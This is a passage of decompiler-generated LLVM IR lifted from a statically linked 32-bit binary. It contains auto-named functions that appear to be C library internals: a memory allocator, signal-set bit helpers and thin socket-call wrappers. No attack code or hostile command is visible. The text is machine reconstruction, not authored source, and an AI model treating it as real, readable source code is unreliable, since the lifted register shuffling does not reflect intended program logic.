  %v1_80519f1 = add i32 %v0_80519ee, 44
  store i32 %v1_80519f1, i32* @edi, align 4
  store i32 %v1_80519f1, i32* %stack_var_-108, align 4
  %v4_8051a02 = inttoptr i32 %v1_80519f1 to i8*
  %v5_8051a02 = call i32 @function_80514c4(i8* %v4_8051a02, i32 %arg1, i32 %v1_80519db, i32 %v1_80519ee)
  %v0_8051a07 = load i32, i32* @edi, align 4
  %v1_8051a07 = load i32, i32* @ebp, align 4
  %v2_8051a07 = add i32 %v1_8051a07, 12
  %v3_8051a07 = inttoptr i32 %v2_8051a07 to i32*
  store i32 %v0_8051a07, i32* %v3_8051a07, align 4
  %v1_8051a0e = add i32 %v0_80519ee, 16
  %v2_8051a0e = inttoptr i32 %v1_8051a0e to i32*
  store i32 0, i32* %v2_8051a0e, align 4
  %v2_8051a15 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_8051a15, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v0_8051a17 = load i32, i32* @ebp, align 4
  store i32 %arg1, i32* %stack_var_-108, align 4
  %v2_8051a1c = inttoptr i32 %arg1 to i8*
  %v3_8051a1c = call i32 @function_80547f8(i8* %v2_8051a1c, i32 %v0_8051a17)
  store i32 %v3_8051a1c, i32* %eax.global-to-local, align 4
  %v1_8051a24 = icmp eq i32 %v3_8051a1c, 0
  br i1 %v1_8051a24, label %dec_label_pc_8051a60, label %dec_label_pc_8051a28

dec_label_pc_8051a28:                             ; preds = %dec_label_pc_80519ee
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  %v0_8051a2c = load i32, i32* @edi, align 4
  store i32 %v0_8051a2c, i32* %arg2, align 4
  %v1_8051a2e = add i32 %tmp18, 8
  %v2_8051a2e = inttoptr i32 %v1_8051a2e to i32*
  store i32 2, i32* %v2_8051a2e, align 4
  %v0_8051a35 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051a35 = add i32 %v0_8051a35, 12
  %v2_8051a35 = inttoptr i32 %v1_8051a35 to i32*
  store i32 4, i32* %v2_8051a35, align 4
  %v2_8051a3c = load i32, i32* %stack_var_-92, align 4
  %v1_8051a3f = load i32, i32* %edx.global-to-local, align 4
  %v2_8051a3f = add i32 %v1_8051a3f, 16
  %v3_8051a3f = inttoptr i32 %v2_8051a3f to i32*
  store i32 %v2_8051a3c, i32* %v3_8051a3f, align 4
  %v1_8051a46 = load i32, i32* %edx.global-to-local, align 4
  %v2_8051a46 = add i32 %v1_8051a46, 4
  %v3_8051a46 = inttoptr i32 %v2_8051a46 to i32*
  store i32 %v1_80519ee, i32* %v3_8051a46, align 4
  store i32 %arg5, i32* @ecx, align 4
  %v0_8051a4d = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8051a4d, i32* %v1_805191f, align 4
  store i32 0, i32* %v1_805196d, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051c36

dec_label_pc_8051a60:                             ; preds = %dec_label_pc_80519ee
  %v0_8051a60 = call i32 @function_8054fe0()
  store i32 %v0_8051a60, i32* @eax, align 4
  %v2_8051a70 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_8051a70, i32* @ebx, align 4
  store i32 %v2_8051a70, i32* %stack_var_-108, align 4
  %v2_8051a75 = call i32 @function_80535d2(i32 %v2_8051a70, i32 134559183)
  store i32 %v2_8051a75, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805d888.337 to i32), i32* %stack_var_-108, align 4
  %v1_8051a81 = call i32 @function_80535cf(i32 ptrtoint (i32* @global_var_805d888.337 to i32))
  store i32 ptrtoint (i32* @global_var_805d888.337 to i32), i32* @ecx, align 4
  store i32 134559183, i32* @eax, align 4
  store i32 %v2_8051a70, i32* %stack_var_-108, align 4
  %v0_8051a8b = load i32, i32* @global_var_8063f74.338, align 4
  store i32 %v0_8051a8b, i32* @esi, align 4
  %v2_8051a91 = call i32 @function_80535d2(i32 %v2_8051a70, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_8051aac = ptrtoint i32* %stack_var_-76 to i32
  %v2_8051ab1 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8051ab1, i32* %eax.global-to-local, align 4
  store i32 %v2_8051ab1, i32* %stack_var_-108, align 4
  %v0_8051abb = load i32, i32* @esi, align 4
  %v7_8051ac2 = call i32 @function_805488c(i8* %v2_8051a1c, i32 1, i32 %v0_8051abb, i32 ptrtoint (i32* @global_var_8063f68.339 to i32), i32 %v2_8051ab1, i32 %v2_8051aac)
  store i32 %v7_8051ac2, i32* %eax.global-to-local, align 4
  %v2_8051aca = icmp slt i32 %v7_8051ac2, 0
  %v1_8051acc = icmp eq i1 %v2_8051aca, false
  br i1 %v1_8051acc, label %dec_label_pc_8051ae2, label %dec_label_pc_8051ace

dec_label_pc_8051ace:                             ; preds = %dec_label_pc_8051a60
  store i32 %arg6, i32* @ecx, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v1_805196d, align 4
  br label %dec_label_pc_8051c36

dec_label_pc_8051ae2:                             ; preds = %dec_label_pc_8051a60
  %v4_8051ae2 = trunc i64 %tmp11 to i32
  store i32 %v4_8051ae2, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v10_8051af5 = icmp ugt i32 %v1_80519db, 256
  %v15_8051af5 = icmp eq i32 %v0_80519db, 300
  %v2_8051af9 = or i1 %v15_8051af5, %v10_8051af5
  br i1 %v2_8051af9, label %dec_label_pc_8051b94, label %dec_label_pc_8051afb

dec_label_pc_8051afb:                             ; preds = %dec_label_pc_8051ae2
  %v3_8051afe = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_8051afe, i32* %stack_var_-108, align 4
  %v1_8051b02 = call i32 @function_8052915(i32 %v3_8051afe)
  store i32 %v1_8051b02, i32* %eax.global-to-local, align 4
  store i32 %v3_8051afe, i32* @edi, align 4
  %v3_8051b08 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8051b08, i32* %stack_var_-108, align 4
  %v1_8051b0c = call i32 @function_8052915(i32 %v3_8051b08)
  store i32 -1, i32* %v1_805196d, align 4
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051c0c

dec_label_pc_8051b94:                             ; preds = %dec_label_pc_8051ae2
  %v3_8051b99.pre = load i32, i32* %stack_var_-76, align 4
  %v0_8051b9d.pre = load i32, i32* @edi, align 4
  store i32 %v0_8051b9d.pre, i32* %stack_var_-108, align 4
  %v4_8051b9e = inttoptr i32 %v0_8051b9d.pre to i8*
  %v5_8051b9e = call i32 @function_80514c4(i8* %v4_8051b9e, i32 %v3_8051b99.pre, i32 %v1_80519db, i32 %v2_8051a70)
  store i32 %v5_8051b9e, i32* %eax.global-to-local, align 4
  store i32 %v0_8051b9d.pre, i32* @ecx, align 4
  %v3_8051ba4 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_8051ba4, i32* %stack_var_-108, align 4
  %v1_8051ba8 = call i32 @function_8052915(i32 %v3_8051ba4)
  store i32 %v1_8051ba8, i32* %eax.global-to-local, align 4
  %v12_8051bb0 = icmp eq i32 %tmp10, 1
  %v1_8051bb5 = icmp eq i1 %v12_8051bb0, false
  br i1 %v1_8051bb5, label %dec_label_pc_8051c11, label %dec_label_pc_8051bb7

dec_label_pc_8051bb7:                             ; preds = %dec_label_pc_8051b94
  %v0_8051bb7 = load i32, i32* @edx, align 4
  %v0_8051bbe = load i32, i32* @ebp, align 4
  store i32 %v0_8051bbe, i32* %stack_var_-108, align 4
  %v3_8051bbf = inttoptr i32 %tmp to i16*
  %v4_8051bbf = call i32 @function_8051414(i16* %v3_8051bbf, i32 4, i32 %v0_8051bb7)
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v0_8051bc8 = load i32, i32* @edi, align 4
  store i32 %v0_8051bc8, i32* %arg2, align 4
  %v1_8051bca = add i32 %tmp18, 8
  %v2_8051bca = inttoptr i32 %v1_8051bca to i32*
  store i32 2, i32* %v2_8051bca, align 4
  %v0_8051bd1 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051bd1 = add i32 %v0_8051bd1, 12
  %v2_8051bd1 = inttoptr i32 %v1_8051bd1 to i32*
  store i32 4, i32* %v2_8051bd1, align 4
  %v3_8051bd8 = load i32, i32* %stack_var_-92, align 4
  store i32 %v3_8051bd8, i32* %edx.global-to-local, align 4
  %v1_8051bdc = load i32, i32* %eax.global-to-local, align 4
  %v2_8051bdc = add i32 %v1_8051bdc, 16
  %v3_8051bdc = inttoptr i32 %v2_8051bdc to i32*
  store i32 %v3_8051bd8, i32* %v3_8051bdc, align 4
  %v1_8051be3 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051be3 = add i32 %v1_8051be3, 4
  %v3_8051be3 = inttoptr i32 %v2_8051be3 to i32*
  store i32 %v1_80519ee, i32* %v3_8051be3, align 4
  %v2_8051be6 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_8051be6, i32* %eax.global-to-local, align 4
  %v3_8051be7 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8051be7, i32* %stack_var_-108, align 4
  %v1_8051beb = call i32 @function_8052915(i32 %v3_8051be7)
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  store i32 %tmp18, i32* %v1_805191f, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %arg6, i32* @ecx, align 4
  store i32 0, i32* %v1_805196d, align 4
  br label %dec_label_pc_8051c0c

dec_label_pc_8051c0c:                             ; preds = %dec_label_pc_8051afb, %dec_label_pc_8051c11, %dec_label_pc_8051bb7
  br label %dec_label_pc_8051c36

dec_label_pc_8051c11:                             ; preds = %dec_label_pc_8051b94
  %v3_8051c14 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8051c14, i32* %stack_var_-108, align 4
  %v1_8051c18 = call i32 @function_8052915(i32 %v3_8051c14)
  store i32 1, i32* %v1_805196d, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051c0c

dec_label_pc_8051c31:                             ; preds = %dec_label_pc_80519db, %dec_label_pc_80519bf, %dec_label_pc_80519b3, %dec_label_pc_80519a0, %dec_label_pc_8051994
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051c36

dec_label_pc_8051c36:                             ; preds = %dec_label_pc_805190c, %dec_label_pc_8051980, %dec_label_pc_8051979, %dec_label_pc_8051935, %dec_label_pc_8051c0c, %dec_label_pc_8051ace, %dec_label_pc_8051a28, %dec_label_pc_8051c31
  store i32 %v0_805190f, i32* @ebx, align 4
  store i32 %v0_805190e, i32* @esi, align 4
  store i32 %v0_805190d, i32* @edi, align 4
  store i32 %v0_805190c, i32* @ebp, align 4
  %v0_8051c3d = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8051c3d

; uselistorder directives
  uselistorder i32 %v2_8051a70, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v1_80519f1, { 1, 0, 2 }
  uselistorder i32 %v1_80519ee, { 2, 1, 0 }
  uselistorder i32 %v1_80519db, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_80519a4.pre, { 0, 2, 1 }
  uselistorder i32 %v1_805198f, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v2_805196d, { 2, 0, 1, 3 }
  uselistorder i32* %v1_805196d, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32* %v1_805191f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 0, 2, 3 }
  uselistorder i32 %tmp18, { 6, 5, 0, 4, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 28, 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 20, 21, 22, 23, 24, 25, 26, 27, 29, 18, 19 }
  uselistorder i32 (i8*, i32)* @function_80547f8, { 1, 0 }
  uselistorder i32 %arg6, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg5, { 2, 0, 1 }
  uselistorder i32 %arg1, { 5, 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8051c36, { 7, 4, 5, 6, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8051c0c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80519a0, { 1, 0 }
}

define i32 @function_8051c40(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051c40:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8051c5b = ptrtoint i32* %stack_var_-12 to i32
  %v2_8051c62 = call i32 @function_805391c(i32 3, i32 %v2_8051c5b)
  ret i32 %v2_8051c62

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_8051c98(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_8051c98:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_8051cc3 = ptrtoint i32* %stack_var_-20 to i32
  %v2_8051cca = call i32 @function_805391c(i32 15, i32 %v2_8051cc3)
  ret i32 %v2_8051cca

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @function_8051cd4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051cd4:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_8051cf7 = ptrtoint i32* %stack_var_-16 to i32
  %v2_8051cfe = call i32 @function_805391c(i32 10, i32 %v2_8051cf7)
  ret i32 %v2_8051cfe

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @function_8051d08(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051d08:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_8051d2b = ptrtoint i32* %stack_var_-16 to i32
  %v2_8051d32 = call i32 @function_805391c(i32 9, i32 %v2_8051d2b)
  ret i32 %v2_8051d32

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @function_8051d80(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_8051d80:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_8051dab = ptrtoint i32* %stack_var_-20 to i32
  %v2_8051db2 = call i32 @function_805391c(i32 14, i32 %v2_8051dab)
  ret i32 %v2_8051db2

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @function_8051dbc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051dbc:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8051dd7 = ptrtoint i32* %stack_var_-12 to i32
  %v2_8051dde = call i32 @function_805391c(i32 1, i32 %v2_8051dd7)
  ret i32 %v2_8051dde

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_805391c, { 2, 1, 3, 4, 5, 0 }
}

define i32 @function_8051de8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051de8:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_8051e00, label %dec_label_pc_8051df3

dec_label_pc_8051df3:                             ; preds = %dec_label_pc_8051de8
  %v1_8051df3 = add i32 %arg1, -64
  %v3_8051df3 = sub i32 63, %arg1
  %v4_8051df3 = and i32 %v3_8051df3, %arg1
  %v5_8051df3 = icmp slt i32 %v4_8051df3, 0
  %v6_8051df3 = icmp eq i32 %v1_8051df3, 0
  %v7_8051df3 = icmp slt i32 %v1_8051df3, 0
  %v3_8051df6 = icmp eq i1 %v7_8051df3, %v5_8051df3
  %v4_8051df6 = icmp eq i1 %v6_8051df3, false
  %v5_8051df6 = and i1 %v4_8051df6, %v3_8051df6
  br i1 %v5_8051df6, label %dec_label_pc_8051e00, label %dec_label_pc_8051df8

dec_label_pc_8051df8:                             ; preds = %dec_label_pc_8051df3
  %v4_8051dfb = call i32 @function_8051f04(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_8051e00

dec_label_pc_8051e00:                             ; preds = %dec_label_pc_8051df3, %dec_label_pc_8051de8, %dec_label_pc_8051df8
  %v1_8051e00 = call i32 @function_8050568(i32 ptrtoint (i32* @0 to i32))
  %v1_8051e05 = inttoptr i32 %v1_8051e00 to i32*
  store i32 22, i32* %v1_8051e05, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_8051df3, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8051e00, { 2, 0, 1 }
}

define i32 @function_8051e14(i32 %arg1) local_unnamed_addr {
dec_label_pc_8051e14:
  %v3_8051e22 = inttoptr i32 %arg1 to i8*
  %v4_8051e22 = call i32 @function_805143c(i8* %v3_8051e22, i32 0, i32 128)
  ret i32 0
}

define i32 @function_8051f04(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051f04:
  %stack_var_-4 = alloca i32, align 4
  %v0_8051f04 = load i32, i32* @ebx, align 4
  store i32 %v0_8051f04, i32* %stack_var_-4, align 4
  %v1_8051f12 = add i32 %arg2, -1
  %v1_8051f15 = urem i32 %v1_8051f12, 32
  %v2_8051f15 = icmp eq i32 %v1_8051f15, 0
  store i32 %v1_8051f15, i32* @ecx, align 4
  %v2_8051f18 = udiv i32 %v1_8051f12, 32
  store i32 %v2_8051f18, i32* @edx, align 4
  br i1 %v2_8051f15, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_8051f04
  %v5_8051f1b = shl i32 1, %v1_8051f15
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_8051f04, %bb
  %v6_8051f1d = phi i32 [ 1, %dec_label_pc_8051f04 ], [ %v5_8051f1b, %bb ]
  %v2_8051f1d = mul nuw nsw i32 %v2_8051f18, 4
  %v3_8051f1d = add i32 %v2_8051f1d, %arg1
  %v4_8051f1d = inttoptr i32 %v3_8051f1d to i32*
  %v5_8051f1d = load i32, i32* %v4_8051f1d, align 4
  %v7_8051f1d = or i32 %v5_8051f1d, %v6_8051f1d
  store i32 %v7_8051f1d, i32* %v4_8051f1d, align 4
  %v2_8051f22 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051f22, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_8051f18, { 1, 0 }
  uselistorder i32 %v1_8051f15, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_8051f24(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051f24:
  %v1_8051f32 = add i32 %arg2, -1
  %v1_8051f35 = urem i32 %v1_8051f32, 32
  %v2_8051f35 = icmp eq i32 %v1_8051f35, 0
  %v2_8051f38 = udiv i32 %v1_8051f32, 32
  br i1 %v2_8051f35, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_8051f24
  %v4_8051f3b = shl i32 -2, %v1_8051f35
  %v5_8051f3b = sub nsw i32 32, %v1_8051f35
  %v6_8051f3b = lshr i32 -2, %v5_8051f3b
  %v7_8051f3b = or i32 %v6_8051f3b, %v4_8051f3b
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_8051f24, %bb
  %v6_8051f3d = phi i32 [ -2, %dec_label_pc_8051f24 ], [ %v7_8051f3b, %bb ]
  %v2_8051f3d = mul nuw nsw i32 %v2_8051f38, 4
  %v3_8051f3d = add i32 %v2_8051f3d, %arg1
  %v4_8051f3d = inttoptr i32 %v3_8051f3d to i32*
  %v5_8051f3d = load i32, i32* %v4_8051f3d, align 4
  %v7_8051f3d = and i32 %v5_8051f3d, %v6_8051f3d
  store i32 %v7_8051f3d, i32* %v4_8051f3d, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_8051f35, { 1, 2, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_8051f44() local_unnamed_addr {
dec_label_pc_8051f44:
  %v0_8051f44 = load i32, i32* @eax, align 4
  %v6_8051f57 = icmp ugt i32 %v0_8051f44, 16777215
  br i1 %v6_8051f57, label %dec_label_pc_8051f68, label %dec_label_pc_8051f59

dec_label_pc_8051f59:                             ; preds = %dec_label_pc_8051f44
  %tmp = icmp ult i32 %v0_8051f44, 256
  %v2_8051f47 = udiv i32 %v0_8051f44, 256
  %v2_8051f59 = call i32 @llvm.ctlz.i32(i32 %v2_8051f47, i1 true)
  %v3_8051f59 = xor i32 %v2_8051f59, 31
  %v5_8051f59 = select i1 %tmp, i32 95, i32 %v3_8051f59
  %v1_8051f5c = add nuw nsw i32 %v5_8051f59, 6
  store i32 %v1_8051f5c, i32* @ecx, align 4
  %v2_8051f5f = urem i32 %v1_8051f5c, 32
  %v4_8051f5f = icmp eq i32 %v2_8051f5f, 0
  br i1 %v4_8051f5f, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_8051f59
  %v5_8051f5f = lshr i32 %v0_8051f44, %v2_8051f5f
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_8051f59, %bb
  %v0_8051f61 = phi i32 [ %v0_8051f44, %dec_label_pc_8051f59 ], [ %v5_8051f5f, %bb ]
  %v1_8051f61 = urem i32 %v0_8051f61, 4
  %v2_8051f64 = mul nuw nsw i32 %v5_8051f59, 4
  %v3_8051f64 = or i32 %v1_8051f61, 32
  %v4_8051f64 = add nuw nsw i32 %v3_8051f64, %v2_8051f64
  br label %dec_label_pc_8051f68

dec_label_pc_8051f68:                             ; preds = %dec_label_pc_8051f44, %bb4
  %v0_8051f69 = phi i32 [ 95, %dec_label_pc_8051f44 ], [ %v4_8051f64, %bb4 ]
  ret i32 %v0_8051f69

; uselistorder directives
  uselistorder i32 %v2_8051f5f, { 1, 0 }
  uselistorder i32 %v0_8051f44, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_8051f68, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_8051f6a(i32 %arg1) local_unnamed_addr {
dec_label_pc_8051f6a:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8051f6a = load i32, i32* @ebp, align 4
  %v0_8051f6b = load i32, i32* @edi, align 4
  %v0_8051f6c = load i32, i32* @esi, align 4
  %v0_8051f6d = load i32, i32* @ebx, align 4
  store i32 %v0_8051f6d, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8051f7f = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8051f7f, i32* @eax, align 4
  store i32 %v2_8051f7f, i32* %stack_var_-92, align 4
  %v2_8051f84 = call i32 @function_80535d2(i32 %v2_8051f7f, i32 134559183)
  store i32 %v2_8051f84, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805d770.340 to i32), i32* %stack_var_-92, align 4
  %v1_8051f90 = call i32 @function_80535cf(i32 ptrtoint (i32* @global_var_805d770.340 to i32))
  store i32 %v1_8051f90, i32* %eax.global-to-local, align 4
  %v0_8051f98 = load i32, i32* %ebx.global-to-local, align 4
  %tmp123 = icmp ult i32 %v0_8051f98, -32
  br i1 %tmp123, label %dec_label_pc_8051faf, label %dec_label_pc_8051f9d

dec_label_pc_8051f9d:                             ; preds = %dec_label_pc_8051f6a
  %v0_8051f9d = load i32, i32* %stack_var_-92, align 4
  %v1_8051f9d = call i32 @function_8050568(i32 %v0_8051f9d)
  store i32 %v1_8051f9d, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8051fa4 = inttoptr i32 %v1_8051f9d to i32*
  store i32 12, i32* %v1_8051fa4, align 4
  br label %dec_label_pc_80526d4

dec_label_pc_8051faf:                             ; preds = %dec_label_pc_8051f6a
  %v1_8051faf = add i32 %v0_8051f98, 11
  %tmp124 = icmp ult i32 %v1_8051faf, 16
  br i1 %tmp124, label %dec_label_pc_8051fc6, label %dec_label_pc_8051fbf

dec_label_pc_8051fbf:                             ; preds = %dec_label_pc_8051faf
  %v1_8051fbf = and i32 %v1_8051faf, -8
  br label %dec_label_pc_8051fc6

dec_label_pc_8051fc6:                             ; preds = %dec_label_pc_8051faf, %dec_label_pc_8051fbf
  %storemerge134 = phi i32 [ %v1_8051fbf, %dec_label_pc_8051fbf ], [ %v1_8051faf, %dec_label_pc_8051faf ]
  %v1_805235e = phi i32 [ %v1_8051fbf, %dec_label_pc_8051fbf ], [ 16, %dec_label_pc_8051faf ]
  store i32 %storemerge134, i32* %eax.global-to-local, align 4
  %v0_8051fc6 = load i8, i8* @global_var_8063be0.341, align 1
  %v1_8051fc6 = sext i8 %v0_8051fc6 to i32
  store i32 %v1_8051fc6, i32* @ebx, align 4
  %v3_8051fcc = urem i8 %v0_8051fc6, 2
  %v4_8051fcc = icmp eq i8 %v3_8051fcc, 0
  %v1_8051fcf = icmp eq i1 %v4_8051fcc, false
  br i1 %v1_8051fcf, label %dec_label_pc_8051fee, label %dec_label_pc_8051fd1

dec_label_pc_8051fd1:                             ; preds = %dec_label_pc_8051fc6
  %v2_8051fd1 = icmp eq i8 %v0_8051fc6, 0
  %v1_8051fd3 = icmp eq i1 %v2_8051fd1, false
  br i1 %v1_8051fd3, label %dec_label_pc_80522c9, label %dec_label_pc_8051fd9

dec_label_pc_8051fd9:                             ; preds = %dec_label_pc_8051fd1
  store i32 ptrtoint (i8* @global_var_8063be0.341 to i32), i32* %stack_var_-92, align 4
  %v2_8051fe1 = call i32 @function_805276d(i32* bitcast (i8* @global_var_8063be0.341 to i32*))
  store i32 %v2_8051fe1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80522c9

dec_label_pc_8051fee:                             ; preds = %dec_label_pc_8051fc6
  %v11_8051fee = trunc i32 %v1_805235e to i8
  %v8_8051ff2 = icmp ugt i8 %v11_8051fee, %v0_8051fc6
  br i1 %v8_8051ff2, label %dec_label_pc_805200f, label %dec_label_pc_8051ff4

dec_label_pc_8051ff4:                             ; preds = %dec_label_pc_8051fee
  %v2_8051ff8 = udiv i32 %v1_805235e, 2
  store i32 %v2_8051ff8, i32* %eax.global-to-local, align 4
  %v1_8051ffa = add i32 %v2_8051ff8, ptrtoint (i8* @global_var_8063be0.341 to i32)
  store i32 %v1_8051ffa, i32* @ecx, align 4
  %v1_8052000 = add i32 %v2_8051ff8, add (i32 ptrtoint (i8* @global_var_8063be0.341 to i32), i32 -4)
  %v2_8052000 = inttoptr i32 %v1_8052000 to i32*
  %v3_8052000 = load i32, i32* %v2_8052000, align 4
  store i32 %v3_8052000, i32* @edx, align 4
  %v1_8052003 = icmp eq i32 %v3_8052000, 0
  br i1 %v1_8052003, label %dec_label_pc_805200f, label %dec_label_pc_8052007

dec_label_pc_8052007:                             ; preds = %dec_label_pc_8051ff4
  %v1_8052007 = add i32 %v3_8052000, 8
  %v2_8052007 = inttoptr i32 %v1_8052007 to i32*
  %v3_8052007 = load i32, i32* %v2_8052007, align 4
  store i32 %v3_8052007, i32* %eax.global-to-local, align 4
  store i32 %v3_8052007, i32* %v2_8052000, align 4
  br label %dec_label_pc_8052048

dec_label_pc_805200f:                             ; preds = %dec_label_pc_8051ff4, %dec_label_pc_8051fee
  %v8_805200f = icmp ult i32 %v1_805235e, 255
  %v6_8052017 = icmp ugt i32 %v1_805235e, 255
  store i32 %v1_805235e, i32* @eax, align 4
  br i1 %v6_8052017, label %dec_label_pc_8052050, label %dec_label_pc_8052019

dec_label_pc_8052019:                             ; preds = %dec_label_pc_805200f
  %v2_805201d = udiv i32 %v1_805235e, 8
  store i32 %v2_805201d, i32* %eax.global-to-local, align 4
  %v1_8052024 = mul nuw i32 %v2_805201d, 8
  %v2_8052024 = add i32 %v1_8052024, ptrtoint (i32* @global_var_8063c0c.342 to i32)
  store i32 %v2_8052024, i32* @ecx, align 4
  %v1_805202b = add i32 %v1_8052024, add (i32 ptrtoint (i32* @global_var_8063c0c.342 to i32), i32 12)
  %v2_805202b = inttoptr i32 %v1_805202b to i32*
  %v3_805202b = load i32, i32* %v2_805202b, align 4
  store i32 %v3_805202b, i32* @edx, align 4
  %v12_805202e = icmp eq i32 %v3_805202b, %v2_8052024
  br i1 %v12_805202e, label %dec_label_pc_805214c.preheader, label %dec_label_pc_8052036

dec_label_pc_8052036:                             ; preds = %dec_label_pc_8052019
  store i32 %v1_805235e, i32* %ebx.global-to-local, align 4
  %v1_805203a = add i32 %v3_805202b, 12
  %v2_805203a = inttoptr i32 %v1_805203a to i32*
  %v3_805203a = load i32, i32* %v2_805203a, align 4
  store i32 %v3_805203a, i32* %eax.global-to-local, align 4
  store i32 %v3_805203a, i32* %v2_805202b, align 4
  %v0_8052040 = load i32, i32* @edx, align 4
  %v1_8052040 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052040 = add i32 %v0_8052040, 4
  %v3_8052040 = add i32 %v2_8052040, %v1_8052040
  %v4_8052040 = inttoptr i32 %v3_8052040 to i32*
  %v5_8052040 = load i32, i32* %v4_8052040, align 4
